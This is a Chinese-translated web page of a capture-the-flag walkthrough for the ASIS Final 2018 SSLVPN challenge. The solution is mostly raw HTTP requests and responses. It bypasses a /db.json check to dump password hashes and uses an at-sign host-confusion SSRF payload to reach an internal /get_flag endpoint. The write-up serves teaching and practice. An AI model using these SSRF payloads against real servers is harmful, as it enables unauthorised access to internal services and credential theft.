<html>
<head>
<title>NodeJS SSRF by Design Flaw — ASIS Final 2018 — SSLVPN Challenge Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">NodeJS SSRF设计缺陷-2018年ASIS决赛SSLVPN挑战演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/nodejs-ssrf-by-design-flaw-asis-final-2018-sslvpn-challenge-walkthrough-5ec4e87bcced?source=collection_archive---------3-----------------------#2018-11-26">https://infosecwriteups.com/nodejs-ssrf-by-design-flaw-asis-final-2018-sslvpn-challenge-walkthrough-5ec4e87bcced?source=collection_archive---------3-----------------------#2018-11-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="8ab5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">参与者会得到一个网址，打开这个网址就会进入一个登录页面。该挑战的主要思想是利用由设计缺陷引起的SSRF漏洞。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/7ac00ae084e41c6b7febc6566bd2bf5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Jw9V__6jYhm2amP74D_0lw.png"/></div></div></figure><p id="1104" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">执行登录请求导致以下响应:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="90d5" class="lc ld iq ky b gy le lf l lg lh">root@cloud:~# curl "<a class="ae li" href="http://162.243.23.15:8000/login" rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8000/login</a>" --data "username=test&amp;password=test" -v<br/>*   Trying 162.243.23.15...<br/>* Connected to 162.243.23.15 (162.243.23.15) port 8000 (#0)<br/>&gt; POST /login HTTP/1.1<br/>&gt; Host: 162.243.23.15:8000<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt; Content-Length: 27<br/>&gt; Content-Type: application/x-www-form-urlencoded<br/>&gt;<br/>* upload completely sent off: 27 out of 27 bytes<br/>&lt; HTTP/1.1 302 Found<br/>&lt; X-Powered-By: Express<br/>&lt; X-Content-Type-Options: nosniff<br/>&lt; X-SSLVPN-Request-Id: 9B60:6E97:25ADB08:45E4D17:5AE34BA4<br/>&lt; X-Database-Request-Check: <strong class="ky ir">db.json</strong><br/>&lt; X-Frame-Options: deny<br/>&lt; Location: /login<br/>&lt; Vary: Accept<br/>&lt; Content-Type: text/plain; charset=utf-8<br/>&lt; Content-Length: 28<br/>&lt; set-cookie: ssl-vpn.sid=s%3AGCY1h6fKsL-So1VdwnrBprvE6yMJ1Dnu.Fl4jN5funPmlwJissxmxsg0ueNXqxgFBgapV5o5i2Og; Path=/; HttpOnly<br/>&lt; Date: Mon, 26 Nov 2018 09:11:53 GMT<br/>&lt; Connection: keep-alive<br/>&lt;<br/>* Connection #0 to host 162.243.23.15 left intact<br/>Found. Redirecting to /login</span></pre><p id="1d5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我们所看到的，X-Database-Request-Check显示了一个试图下载数据库的文件:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="07f9" class="lc ld iq ky b gy le lf l lg lh">root@cloud:~# curl "<a class="ae li" href="http://162.243.23.15:8000/db.json" rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8000/db.json</a>" -v<br/>*   Trying 162.243.23.15...<br/>* Connected to 162.243.23.15 (162.243.23.15) port 8000 (#0)<br/>&gt; GET /db.json HTTP/1.1<br/>&gt; Host: 162.243.23.15:8000<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt;<br/>&lt; HTTP/1.1 200 OK<br/>&lt; X-Powered-By: Express<br/>&lt; set-cookie: ssl-vpn.sid=s%3ApGmZoWtgH-hrMlQ1erZMqalqkz_kfYWn.oucKCZhajGFT2jumpOgKBpN%2BImIoN5nkOz9nFXnb7Xs; Path=/; HttpOnly<br/>&lt; Date: Mon, 26 Nov 2018 09:24:48 GMT<br/>&lt; Connection: keep-alive<br/>&lt; Transfer-Encoding: chunked<br/>&lt;<br/>* Connection #0 to host 162.243.23.15 left intact<br/><strong class="ky ir">Unauthorized: endpint URI cannot be /db.json</strong></span></pre><p id="b6b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">考虑到错误和应用程序由NodeJS部署的事实，可能会有类似的情况:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="3693" class="lc ld iq ky b gy le lf l lg lh">if (request.uri === '<strong class="ky ir">/db.json</strong>') {<br/>        result.end('Unauthorized: endpint URI cannot be /db.json')<br/>    } else {</span></pre><p id="23d7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="9fd0" class="lc ld iq ky b gy le lf l lg lh">root@cloud:~# curl "<a class="ae li" href="http://162.243.23.15:8000/db.json" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">http://162.243.23.15:8000/db.json</strong></a><strong class="ky ir">?something</strong>" -v<br/>*   Trying 162.243.23.15...<br/>* Connected to 162.243.23.15 (162.243.23.15) port 8000 (#0)<br/>&gt; GET /db.json? HTTP/1.1<br/>&gt; Host: 162.243.23.15:8000<br/>&gt; User-Agent: curl/7.47.0<br/>&gt; Accept: */*<br/>&gt;<br/>&lt; HTTP/1.1 200 OK<br/>&lt; X-Powered-By: Express<br/>&lt; set-cookie: ssl-vpn.sid=s%3A5tgeVNTR7jrpbYY6MqQJ0hYgWkUw4tbq.OBYPK5%2ByT2svgsBK3UqWAQzCSiO%2FzKFwPw2tFKcGDVw; Path=/; HttpOnly<br/>&lt; Date: Mon, 26 Nov 2018 09:28:46 GMT<br/>&lt; Connection: keep-alive<br/>&lt; Transfer-Encoding: chunked<br/>&lt;<br/>{<br/>  "credentials": [{<br/>    "id": "1",<br/>    "display_name": "admin",<br/>    "user": "<strong class="ky ir">administrator</strong>",<br/>    "pass": "<strong class="ky ir">ce5f2ce89fa4b39778404b3a7a9dc13b</strong>"<br/>  }, {<br/>    "id": "2",<br/>    "display_name": "user",<br/>    "user": "<strong class="ky ir">user1</strong>",<br/>    "pass": "<strong class="ky ir">825a3895b83513dce6997ef03f1597fb</strong>"<br/>  },{<br/>    "id": "3",<br/>    "display_name": "David",<br/>    "user": "<strong class="ky ir">david</strong>",<br/>    "pass": "<strong class="ky ir">195f19b835efe9f0b7b4e276ef1a8515</strong>"<br/>  }]<br/>* Connection #0 to host 162.243.23.15 left intact<br/>}</span></pre><p id="7f7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">三位用户透露，只有大卫的密码在谷歌中被索引:<code class="fe lj lk ll ky b">p@ss</code>。登录成功，有两个菜单，一个是工作菜单<code class="fe lj lk ll ky b">echo service</code>。请求:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="1f57" class="lc ld iq ky b gy le lf l lg lh">POST /echo_service/<strong class="ky ir">test</strong> HTTP/1.1<br/>Host: 162.243.23.15:8000<br/>User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae li" href="http://162.243.23.15:8000/echo_service" rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8000/echo_service</a><br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>X-Requested-With: XMLHttpRequest<br/>Content-Length: 35<br/>DNT: 1<br/>Connection: close<br/>Cookie: ssl-vpn.sid=s%3AV36bk4zshY4AqqeaSBYWP8xPDavprlIO.2PokuOB8TKDTxXXKrMuXW5Cfbp%2Bp0k7iLPDInYkwnyg</span><span id="cfbd" class="lc ld iq ky b gy lm lf l lg lh">path=<strong class="ky ir">%2Fecho%2F</strong>&amp;server=<strong class="ky ir">echo2.server</strong></span><span id="2e89" class="lc ld iq ky b gy lm lf l lg lh">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Date: Sun, 25 Nov 2018 21:14:50 GMT<br/>Connection: close<br/>Content-Length: 2</span><span id="32b6" class="lc ld iq ky b gy lm lf l lg lh"><strong class="ky ir">test</strong></span></pre><p id="0153" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请求中的变量以粗体显示。在<code class="fe lj lk ll ky b">server</code>上模糊导致它不能改变，唯一可以接受的值是<code class="fe lj lk ll ky b">echo2.server</code>。回声服务是在<a class="ae li" href="http://162.243.23.15:8001." rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8001</a>服务。我们根据以下要求做了一些模糊处理:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="6d12" class="lc ld iq ky b gy le lf l lg lh">POST /echo_service/<strong class="ky ir">[FUZZ]</strong> HTTP/1.1<br/>Host: 162.243.23.15:8000<br/>User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae li" href="http://162.243.23.15:8000/echo_service" rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8000/echo_service</a><br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>X-Requested-With: XMLHttpRequest<br/>Content-Length: 35<br/>DNT: 1<br/>Connection: close<br/>Cookie: ssl-vpn.sid=s%3AV36bk4zshY4AqqeaSBYWP8xPDavprlIO.2PokuOB8TKDTxXXKrMuXW5Cfbp%2Bp0k7iLPDInYkwnyg</span><span id="c173" class="lc ld iq ky b gy lm lf l lg lh">path=&amp;server=<strong class="ky ir">echo2.server</strong></span><span id="350d" class="lc ld iq ky b gy lm lf l lg lh">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Date: Sun, 25 Nov 2018 21:14:50 GMT<br/>Connection: close<br/>Content-Length: 2</span><span id="cab0" class="lc ld iq ky b gy lm lf l lg lh"><strong class="ky ir">test</strong></span></pre><p id="6368" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><ol class=""><li id="806e" class="ln lo iq jp b jq jr ju jv jy lp kc lq kg lr kk ls lt lu lv bi translated">像123这样的数字:</li></ol><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="8355" class="lc ld iq ky b gy le lf l lg lh">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json; charset=utf-8<br/>Content-Length: 2<br/>ETag: W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"<br/>Date: Mon, 26 Nov 2018 12:45:28 GMT<br/>Connection: close</span><span id="b11f" class="lc ld iq ky b gy lm lf l lg lh"><strong class="ky ir">{}</strong></span></pre><p id="2059" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.字符和一些符号:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="9213" class="lc ld iq ky b gy le lf l lg lh">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json; charset=utf-8<br/>Content-Length: 98<br/>ETag: W/"62-nYT+i7lNNe2ZqULvWWulYdzrkc0"<br/>Date: Mon, 26 Nov 2018 12:46:46 GMT<br/>Connection: close</span><span id="391c" class="lc ld iq ky b gy lm lf l lg lh"><strong class="ky ir">{"errno":"ECONNREFUSED","code":"ECONNREFUSED","syscall":"connect","address":"127.0.0.1","port":80}</strong></span></pre><p id="e765" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.包含<code class="fe lj lk ll ky b">at-sign</code>符号的有效载荷(一个好的列表可以在<a class="ae li" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection" rel="noopener ugc nofollow" target="_blank">这里</a>找到):</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="1b3f" class="lc ld iq ky b gy le lf l lg lh">POST /echo_service/<strong class="ky ir">@127.2.2.2:80</strong> HTTP/1.1<br/>Host: 162.243.23.15:8000<br/>User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae li" href="http://162.243.23.15:8000/echo_service" rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8000/echo_service</a><br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>X-Requested-With: XMLHttpRequest<br/>Content-Length: 25<br/>DNT: 1<br/>Connection: close<br/>Cookie: ssl-vpn.sid=s%3AVTX_48iVuQZIAcc-NEd-B5atdaP46tDF.dGNqdNqW99wz1GO5lmn7wFgflCKpz8ApAfaFoP3A8jc</span><span id="7a92" class="lc ld iq ky b gy lm lf l lg lh">path=&amp;server=echo2.server</span><span id="9330" class="lc ld iq ky b gy lm lf l lg lh">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Content-Type: application/json; charset=utf-8<br/>Content-Length: 98<br/>ETag: W/"62-yz7b2xcC3rXy4a49tqedeg+viXk"<br/>Date: Mon, 26 Nov 2018 12:52:05 GMT<br/>Connection: close</span><span id="1f52" class="lc ld iq ky b gy lm lf l lg lh">{"errno":"ECONNREFUSED","code":"ECONNREFUSED","syscall":"connect","address":"<strong class="ky ir">127.2.2.2</strong>","port":80}</span></pre><p id="b177" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">等一下，主持人已经换了！因此，服务器端逻辑如下图所示</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lw"><img src="../Images/15acf03a6908e97fedb0900d262559ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_7eHTrErSAlU1pKY8MmHUw.jpeg"/></div></div></figure><p id="e8b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">考虑以下HTML提示:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="5a5a" class="lc ld iq ky b gy le lf l lg lh">&lt;!--p Warning: some menues may be filtered (not shown) due to your IP address.--&gt;</span></pre><p id="e44a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了我可以控制宿主之外:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="8cff" class="lc ld iq ky b gy le lf l lg lh">http://162.243.23.15[The Input]</span></pre><p id="0d47" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以合适的有效载荷是@127.0.0.1:8000:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="75e9" class="lc ld iq ky b gy le lf l lg lh">http://162.243.23.15@127.0.0.1:8000/</span></pre><p id="6154" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="4ab2" class="lc ld iq ky b gy le lf l lg lh">&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;&lt;meta name="description" content=""&gt;&lt;meta name="author" content=""&gt;&lt;title&gt;BOOGY SSL-VPN Portal&lt;/title&gt;&lt;link href="/stylesheets/style.css" rel="stylesheet"&gt;&lt;script src="/js/jquery-3.3.1.min.js"&gt;&lt;/script&gt;&lt;script src="/js/site.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="modal"&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="/login"&gt;Login&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="<strong class="ky ir">/get_flag</strong>"&gt;Flag&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div class="wrapper"&gt;&lt;h2&gt;BOOGY SSL VPN Portal&lt;/h2&gt;&lt;br&gt;&lt;p&gt;Welcome to VPN portal. The portal provides internal services through web.&lt;/p&gt;</span></pre><p id="68cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最终有效载荷:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="cdf6" class="lc ld iq ky b gy le lf l lg lh">POST /echo_service/<strong class="ky ir">@127.2.2.2:8000%2fget_flag</strong> HTTP/1.1<br/>Host: 162.243.23.15:8000<br/>User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0<br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Referer: <a class="ae li" href="http://162.243.23.15:8000/echo_service" rel="noopener ugc nofollow" target="_blank">http://162.243.23.15:8000/echo_service</a><br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>X-Requested-With: XMLHttpRequest<br/>Content-Length: 25<br/>DNT: 1<br/>Connection: close<br/>Cookie: ssl-vpn.sid=s%3AVTX_48iVuQZIAcc-NEd-B5atdaP46tDF.dGNqdNqW99wz1GO5lmn7wFgflCKpz8ApAfaFoP3A8jc</span><span id="b4f5" class="lc ld iq ky b gy lm lf l lg lh">path=&amp;server=echo2.server</span></pre><p id="5fa6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回应是:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="23de" class="lc ld iq ky b gy le lf l lg lh">HTTP/1.1 200 OK<br/>X-Powered-By: Express<br/>Date: Mon, 26 Nov 2018 12:58:33 GMT<br/>Connection: close<br/>Content-Length: 38</span><span id="e5c1" class="lc ld iq ky b gy lm lf l lg lh">ASIS{97016c66cd3bddc7624622336ffeeae8}</span></pre></div></div>    
</body>
</html>